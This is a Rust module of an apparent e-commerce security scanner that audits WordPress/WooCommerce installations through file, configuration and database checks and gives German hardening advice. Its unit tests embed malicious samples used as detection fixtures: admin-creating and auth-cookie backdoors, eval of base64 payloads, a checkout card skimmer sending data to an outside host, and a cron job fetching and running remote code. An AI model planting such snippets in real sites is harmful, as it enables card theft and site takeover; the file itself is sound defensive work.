//! WooCommerce (WordPress) adapter.
//!
//! * Detects a WordPress installation (`wp-config.php` in the web root or one
//!   level above, `wp-includes/version.php`) and whether the WooCommerce
//!   plugin is present; plain WordPress is scanned as well.
//! * Reads `wp-config.php` (`DB_*`, `$table_prefix`, salts, hardening
//!   constants), the WordPress version from `wp-includes/version.php` and
//!   the WooCommerce version from the plugin header.
//! * File scan profile: `wp-content/uploads`, `wp-content/upgrade` and
//!   `wp-content/wc-logs` must not contain code, caches are generated,
//!   `wp-admin`/`wp-includes` are the core.
//! * File checks: must-use plugins, plugin folders without header ("fake
//!   plugins"), modified `index.php`, extra includes in `wp-config.php`,
//!   plugin/theme inventory, permissions, optional WordPress.org version
//!   check (`--online`).
//! * Database checks (prefix aware, SELECT only): privileged accounts with
//!   change detection and last login, registration/default role,
//!   `siteurl`/`home`, active plugins, script/code injections in options and
//!   posts, WP-Cron hooks, payment gateway settings (PayPal, Stripe, BACS …)
//!   with change detection, WooCommerce REST API keys and webhooks.

mod config;
mod db_checks;
mod inventory;
pub mod php_serial;

pub use config::WpConfig;
pub use inventory::Extension;

use ecomsec_core::finding::{Category, Finding, Severity, Source};
use ecomsec_core::platform::{
    Advisory, ComponentVersion, ConfigFileSpec, FileScanProfile, IntegrityItem, IntegrityReport,
    IntegrityStatus, PatchState, Platform, PlatformContext, PlatformInfo, PlatformKind,
};
use ecomsec_core::recommendations::{Recommendation, RecommendationGroupKind};
use ecomsec_core::report::Report;
use ecomsec_core::rules::RuleSet;
use ecomsec_core::version::Version;
use std::path::{Path, PathBuf};

pub const PLATFORM_ID: &str = "woocommerce";
pub const PLATFORM_NAME: &str = "WooCommerce (WordPress)";
/// Component name used by advisories that concern the WooCommerce plugin
/// rather than WordPress core.
pub const COMPONENT_WOOCOMMERCE: &str = "WooCommerce";
pub const RULES_TOML: &str = include_str!("../signatures/rules_woocommerce.toml");
/// Embedded advisory file (`advisories/woocommerce.toml` in the repository).
pub const ADVISORIES_TOML: &str = include_str!("../../../advisories/woocommerce.toml");

const WC_MAIN_FILE: &str = "wp-content/plugins/woocommerce/woocommerce.php";

/// What is known about the WooCommerce plugin of an installation.
#[derive(Debug, Clone, Default)]
pub struct WooCommerceInfo {
    pub installed: bool,
    pub version: Option<Version>,
}

pub struct WooCommerce {
    root: PathBuf,
    config: WpConfig,
    version: Option<Version>,
    version_source: String,
    woo: WooCommerceInfo,
    allow_hosts: Vec<String>,
}

impl WooCommerce {
    /// Does `root` look like a WordPress installation?
    pub fn detect(root: &Path) -> bool {
        root.join("wp-includes/version.php").is_file()
            && (WpConfig::locate(root).is_some() || root.join("wp-settings.php").is_file())
    }

    pub fn open(root: impl Into<PathBuf>) -> anyhow::Result<Self> {
        let root = root.into();
        let root = root.canonicalize().unwrap_or(root);
        let config = WpConfig::load(&root);
        let (version, version_source) = config::wordpress_version(&root);
        let woo = woocommerce_info(&root);
        Ok(WooCommerce {
            root,
            config,
            version,
            version_source,
            woo,
            allow_hosts: Vec::new(),
        })
    }

    /// Additional script hosts considered legitimate (`--allow-host`).
    pub fn with_allow_hosts(mut self, hosts: Vec<String>) -> Self {
        self.allow_hosts = hosts;
        self
    }

    pub fn root(&self) -> &Path {
        &self.root
    }

    pub fn config(&self) -> &WpConfig {
        &self.config
    }

    pub fn woocommerce(&self) -> &WooCommerceInfo {
        &self.woo
    }
}

/// WooCommerce presence and version (plugin header `Version:`).
pub fn woocommerce_info(root: &Path) -> WooCommerceInfo {
    let main = root.join(WC_MAIN_FILE);
    if !main.is_file() {
        return WooCommerceInfo {
            installed: root.join("wp-content/plugins/woocommerce").is_dir(),
            version: None,
        };
    }
    let headers = config::file_headers(&main);
    WooCommerceInfo {
        installed: true,
        version: headers.get("version").and_then(|v| Version::parse(v)),
    }
}

fn embedded_advisories() -> Vec<Advisory> {
    let mut db = ecomsec_core::AdvisoryDb::new();
    db.merge_toml("builtin:advisories/woocommerce.toml", ADVISORIES_TOML)
        .expect("embedded WooCommerce advisories are valid");
    db.for_platform(PLATFORM_ID)
}

impl Platform for WooCommerce {
    fn info(&self) -> PlatformInfo {
        let mut details = vec![
            (
                "Variante".to_string(),
                if self.woo.installed {
                    "WordPress mit WooCommerce".to_string()
                } else {
                    "WordPress ohne WooCommerce (reine WordPress-Prüfung)".to_string()
                },
            ),
            ("Versionsquelle".to_string(), self.version_source.clone()),
        ];
        if self.woo.installed {
            details.push((
                "WooCommerce".into(),
                self.woo
                    .version
                    .as_ref()
                    .map(|v| v.to_string())
                    .unwrap_or_else(|| "Version unbekannt".into()),
            ));
        }
        if let Some(db) = &self.config.db {
            details.push(("Datenbank".into(), db.display()));
        }
        details.push(("Tabellenpräfix".into(), self.config.table_prefix.clone()));
        if self.config.outside_webroot {
            details.push(("wp-config.php".into(), "oberhalb des Webroots".into()));
        }
        PlatformInfo {
            id: PLATFORM_ID.into(),
            name: PLATFORM_NAME.into(),
            kind: PlatformKind::SelfHosted,
            version: self.version.clone(),
            root: Some(self.root.clone()),
            target: self
                .config
                .get("WP_HOME")
                .or(self.config.get("WP_SITEURL"))
                .map(str::to_string),
            details,
        }
    }

    fn file_scan_profile(&self) -> Option<FileScanProfile> {
        let mut p = FileScanProfile::new(&self.root);
        p.public_root = Some(self.root.clone());
        // Caches legitimately contain generated PHP (W3TC object cache,
        // Wordfence WAF config, Divi/LiteSpeed caches, update rollbacks).
        p.generated_dirs = vec![
            "wp-content/cache".into(),
            "wp-content/et-cache".into(),
            "wp-content/litespeed".into(),
            "wp-content/wflogs".into(),
            "wp-content/upgrade-temp-backup".into(),
            "wp-content/uploads/cache".into(),
        ];
        p.upload_dirs = vec![
            "wp-content/uploads".into(),
            "wp-content/upgrade".into(),
            "wp-content/wc-logs".into(),
            "wp-content/blogs.dir".into(),
        ];
        // WooCommerce logs end in `.log` and are classified by extension;
        // the debug log is listed explicitly.
        p.log_dirs = vec!["wp-content/debug.log".into()];
        p.core_dirs = vec!["wp-admin".into(), "wp-includes".into()];
        p.config_files = vec![
            ConfigFileSpec {
                path: if self.config.outside_webroot {
                    "../wp-config.php".into()
                } else {
                    "wp-config.php".into()
                },
                description: "WordPress-Konfiguration (DB-Zugang, Salts)".into(),
                secret: true,
            },
            ConfigFileSpec {
                path: ".htaccess".into(),
                description: "Webserver-Konfiguration im Webroot".into(),
                secret: false,
            },
            ConfigFileSpec {
                path: ".user.ini".into(),
                description: "PHP-Konfiguration (auto_prepend_file …)".into(),
                secret: false,
            },
        ];
        Some(p)
    }

    fn rules(&self) -> RuleSet {
        RuleSet::from_toml("builtin:rules_woocommerce", RULES_TOML)
            .expect("embedded WooCommerce rules compile")
    }

    fn advisories(&self) -> Vec<Advisory> {
        embedded_advisories()
    }

    fn component_version(&self, component: &str) -> ComponentVersion {
        if !component.eq_ignore_ascii_case(COMPONENT_WOOCOMMERCE) {
            return ComponentVersion::Unknown;
        }
        match (&self.woo.installed, &self.woo.version) {
            (false, _) => ComponentVersion::NotInstalled,
            (true, Some(v)) => ComponentVersion::Installed(v.clone()),
            (true, None) => ComponentVersion::Unknown,
        }
    }

    fn integrity(&self, ctx: &PlatformContext) -> anyhow::Result<IntegrityReport> {
        let mut report = IntegrityReport::default();
        report.items.push(
            IntegrityItem::new(
                "shop.version",
                "Shop",
                "WordPress Version",
                if self.version.is_some() {
                    IntegrityStatus::Ok
                } else {
                    IntegrityStatus::Warning
                },
                self.version
                    .as_ref()
                    .map(|v| v.to_string())
                    .unwrap_or_else(|| "unbekannt".into()),
            )
            .with_detail(format!("Quelle: {}", self.version_source)),
        );
        report.items.push(
            IntegrityItem::new(
                "shop.woocommerce",
                "Shop",
                "WooCommerce Version",
                match (&self.woo.installed, &self.woo.version) {
                    (true, Some(_)) => IntegrityStatus::Ok,
                    (true, None) => IntegrityStatus::Warning,
                    (false, _) => IntegrityStatus::Unknown,
                },
                match (&self.woo.installed, &self.woo.version) {
                    (true, Some(v)) => v.to_string(),
                    (true, None) => "installiert, Version unbekannt".into(),
                    (false, _) => "nicht installiert".into(),
                },
            )
            .with_detail(format!("Quelle: {WC_MAIN_FILE}")),
        );
        inventory::wp_config_checks(&self.root, &self.config, &mut report);
        inventory::index_php_check(&self.root, &mut report);
        inventory::mu_plugin_checks(&self.root, ctx, &mut report);
        let plugins = inventory::plugins(&self.root);
        let themes = inventory::themes(&self.root);
        inventory::inventory_checks(&self.root, &plugins, &themes, ctx, &mut report);
        inventory::permission_checks(&self.root, &self.config, &mut report);
        if ctx.online {
            inventory::online_checks(
                &plugins,
                self.version.as_ref(),
                &inventory::WpOrgClient::default(),
                &mut report,
            );
        } else {
            report.items.push(inventory::offline_item(&plugins));
        }
        if ctx.skip_remote {
            report
                .limitations
                .push("Datenbankprüfungen übersprungen (--skip-remote).".into());
            return Ok(report);
        }
        match &self.config.db {
            None => {
                report.limitations.push(
                    "Keine Datenbank-Zugangsdaten in wp-config.php gefunden – Admin-Konten, Optionen, \
                     Zahlungs- und API-Einstellungen nicht geprüft."
                        .into(),
                );
                report.findings.push(
                    Finding::new(
                        Severity::Info,
                        Category::ScanLimitation,
                        Source::Scanner,
                        "wp_db_config_missing",
                        "wp-config.php",
                        "Datenbankprüfungen nicht möglich: DB_NAME/DB_USER/DB_HOST nicht lesbar",
                    )
                    .with_description(
                        "wp-config.php wurde weder im Webroot noch eine Ebene darüber gefunden oder enthält \
                         keine literal definierten Zugangsdaten (WORDPRESS_DB_* aus der Umgebung werden \
                         ebenfalls ausgewertet).",
                    ),
                );
            }
            Some(creds) => match creds.connect() {
                Ok(mut conn) => db_checks::run(self, &plugins, &mut conn, ctx, &mut report),
                Err(e) => {
                    report
                        .limitations
                        .push(format!("Datenbank nicht erreichbar: {e}"));
                    report.findings.push(
                        Finding::new(
                            Severity::Info,
                            Category::ScanLimitation,
                            Source::Database,
                            "wp_db_unreachable",
                            creds.display(),
                            "Datenbank nicht erreichbar – DB-Prüfungen übersprungen",
                        )
                        .with_description(e.to_string()),
                    );
                }
            },
        }
        Ok(report)
    }

    fn recommendations(&self, report: &Report) -> Vec<Recommendation> {
        let mut recs = Vec::new();
        let open: Vec<&Advisory> = report
            .advisories
            .iter()
            .filter(|a| matches!(a.state, PatchState::Vulnerable | PatchState::Unknown))
            .map(|a| &a.advisory)
            .collect();
        if !open.is_empty() {
            let woo = open.iter().any(|a| a.component.is_some());
            let core = open.iter().any(|a| a.component.is_none());
            recs.push(Recommendation::new(
                RecommendationGroupKind::Immediate,
                1,
                match (core, woo) {
                    (true, true) => "WordPress und WooCommerce aktualisieren",
                    (false, true) => "WooCommerce aktualisieren",
                    _ => "WordPress aktualisieren",
                },
                "Dashboard › Aktualisierungen bzw. `wp core update` / `wp plugin update woocommerce` \
                 (WP-CLI). WordPress-Sicherheitsfixes werden für ältere Branches als Minor-Releases \
                 nachgereicht, WooCommerce-Fixes als Point-Releases je Branch. Danach Salts in \
                 wp-config.php erneuern und Admin-Passwörter rotieren.",
            ));
        }
        recs.push(Recommendation::new(
            RecommendationGroupKind::Hardening,
            2,
            "Datei-Editor deaktivieren und Salts rotieren",
            "In wp-config.php `define('DISALLOW_FILE_EDIT', true);` setzen (bei Deployments per Git/CI \
             zusätzlich `DISALLOW_FILE_MODS`). Nach jedem Verdacht die acht Schlüssel/Salts über \
             https://api.wordpress.org/secret-key/1.1/salt/ neu erzeugen – das invalidiert alle Sitzungen \
             und gestohlene Login-Cookies.",
        ));
        recs.push(Recommendation::new(
            RecommendationGroupKind::Hardening,
            3,
            "Plugins und Themes ausmisten",
            "Nicht genutzte Plugins und Themes löschen (nicht nur deaktivieren), nur Plugins aus dem \
             WordPress.org-Verzeichnis oder von bekannten Herstellern einsetzen, „Nulled“-Plugins meiden. \
             Automatische Updates für Plugins aktivieren und `ecomsec scan --online` regelmäßig laufen lassen.",
        ));
        recs.push(Recommendation::new(
            RecommendationGroupKind::Hardening,
            3,
            "Zwei-Faktor-Anmeldung und Login-Schutz",
            "2FA für alle Administratoren und Shop-Manager erzwingen (z. B. Plugin „Two Factor“ oder \
             „Wordfence Login Security“), XML-RPC deaktivieren, wenn nicht benötigt, und Login-Versuche \
             begrenzen. Anzahl der Administratoren minimieren.",
        ));
        recs.push(Recommendation::new(
            RecommendationGroupKind::Hardening,
            3,
            "WAF und Ausführungssperre für Uploads",
            "Eine Web Application Firewall (Hoster-WAF, Cloudflare, Wordfence/Sucuri) vor den Shop setzen und \
             PHP-Ausführung in wp-content/uploads per Webserver-Regel verbieten. wp-config.php möglichst \
             eine Ebene über den Webroot verschieben.",
        ));
        recs
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn embedded_advisories_parse_and_match() {
        let advs = embedded_advisories();
        assert!(advs.len() >= 5);
        let sqli = advs.iter().find(|a| a.id == "CVE-2022-21661").unwrap();
        assert!(sqli.component.is_none());
        assert!(sqli.affects(&Version::parse("5.8.2").unwrap()));
        assert!(!sqli.affects(&Version::parse("5.8.3").unwrap()));
        assert!(!sqli.affects(&Version::parse("5.7.5").unwrap()));
        assert!(sqli.affects(&Version::parse("5.7.4").unwrap()));
        let store = advs.iter().find(|a| a.id == "CVE-2025-15033").unwrap();
        assert_eq!(store.component.as_deref(), Some(COMPONENT_WOOCOMMERCE));
        assert!(store.affects(&Version::parse("9.8.5").unwrap()));
        assert!(!store.affects(&Version::parse("9.8.6").unwrap()));
        assert!(!store.affects(&Version::parse("8.0.3").unwrap()));
    }

    #[test]
    fn rules_hit_samples() {
        let tmp = tempfile::tempdir().unwrap();
        let wc = WooCommerce::open(tmp.path()).unwrap();
        let rules = wc.rules();
        let names = |class: &str, data: &str| -> Vec<String> {
            rules
                .scan(class, data.as_bytes())
                .iter()
                .map(|h| h.rule.name().to_string())
                .collect()
        };
        assert!(names(
            "php",
            "<?php add_action('init', function(){ if(isset($_GET['xk'])){ $u = wp_create_user('wpadmin2', 'x', 'a@b.ru'); $user = new WP_User($u); $user->set_role('administrator'); } });"
        )
        .contains(&"wp_backdoor_admin_creation".to_string()));
        assert!(names(
            "php",
            "<?php if($_COOKIE['k']=='x'){ $u = get_users(array('role'=>'administrator')); wp_set_auth_cookie($u[0]->ID); }"
        )
        .contains(&"wp_auth_cookie_backdoor".to_string()));
        assert!(names(
            "php",
            "<?php add_action('wp_head', function(){ eval(base64_decode(get_option('wp_cache_x'))); });"
        )
        .contains(&"wp_hook_eval_payload".to_string()));
        assert!(names(
            "php",
            "<?php @include \"\\x2fhome/u/.cache/favicon_a1b2.ico\";"
        )
        .contains(&"wp_include_non_php_file".to_string()));
        assert!(names(
            "js",
            "jQuery('form.checkout').on('checkout_place_order', function(){ var d = btoa(JSON.stringify({n: jQuery('#billing_email').val(), c: jQuery('#stripe-card-number').val()})); new Image().src = 'https://cdn-jquery.top/i.gif?d=' + d; });"
        )
        .contains(&"wc_checkout_skimmer".to_string()));
        assert!(
            names("image", "<?php $x = base64_decode($_POST['a']); eval($x);")
                .contains(&"wp_php_in_image_file".to_string())
        );
        assert!(names(
            "php",
            "<?php wp_schedule_event(time(), 'hourly', 'wp_upd'); add_action('wp_upd', function(){ $c = wp_remote_retrieve_body(wp_remote_get('http://x.top/p.txt')); eval($c); });"
        )
        .contains(&"wp_cron_remote_payload".to_string()));
        assert!(names(
            "php",
            "<?php update_option('siteurl', 'https://evil.example/');"
        )
        .contains(&"wp_siteurl_hijack_code".to_string()));
        // Plain WooCommerce template code does not trigger.
        assert!(names(
            "php",
            "<?php do_action('woocommerce_checkout_before_customer_details'); wc_get_template('checkout/payment.php');"
        )
        .is_empty());
    }
}
